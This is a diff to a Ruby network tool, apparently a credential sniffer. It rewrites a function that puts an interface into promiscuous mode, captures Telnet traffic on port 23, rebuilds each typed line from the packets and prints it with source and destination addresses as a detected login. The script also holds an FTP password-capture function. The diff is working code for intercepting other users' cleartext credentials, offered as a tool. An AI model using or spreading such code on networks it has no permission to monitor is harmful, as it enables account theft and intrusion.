@@ -150,27 +150,35 @@ def capture_FTP_passwords(iface)
 end
 
 #Capture Telenet Passwords
-def  capture_TELNET_passwords(iface)
-        puts "[+] Sniffing Telnet Credentials......".colorize(:green).bold
-        puts ""
-        PacketGen.capture(iface:iface, promisc: true) do |pkt|
-          next unless pkt.is?('TCP')
-          next unless pkt.tcp.dport == 23 || pkt.tcp.sport == 23
-          next unless pkt.is?('IP')
+ def capture_TELNET_passwords(iface)
+  puts "[+] Sniffing Telnet Credentials......".colorize(:green).bold
+  puts "NOTE: This may show each character two times".colorize(:light_blue)
 
-          body = pkt.tcp.body.to_s.strip
-          if body.start_with?('USER') || body.start_with?('PASS')
-            puts "From #{pkt.ip.src} --> #{pkt.ip.dst}"
-          end
+  buffer = ""
 
-          if body.start_with?('USER') 
-            puts "[+] Telnet Username Detected #{body}".colorize(:yellow).bold
-            elsif body.start_with?('PASS')
-              puts "[+] Telnet Password Detected: #{body}".colorize(:red).bold
-              puts "-" * 100
-            end
-          end
+  PacketGen.capture(iface: iface, promisc: true) do |pkt|
+    next unless pkt.is?('TCP')
+    next unless pkt.tcp.dport == 23 || pkt.tcp.sport == 23
+    next unless pkt.is?('IP')
+    next unless pkt.tcp.body  # skip empty body
+
+    body = pkt.tcp.body.to_s
+
+    body.each_char do |ch|
+      if ch.ord.between?(32, 126)  # printable characters
+        buffer += ch
+      elsif ch == "\n" || ch == "\r"  # Enter pressed
+        unless buffer.empty?
+          puts "[Captured] #{buffer}".colorize(:green)
+          puts "From #{pkt.ip.src} --> #{pkt.ip.dst}".colorize(:cyan)
+          puts "Login Detected"
+          puts "-" * 100
+          buffer = ""
         end
+      end
+    end
+  end
+end
       
      
 
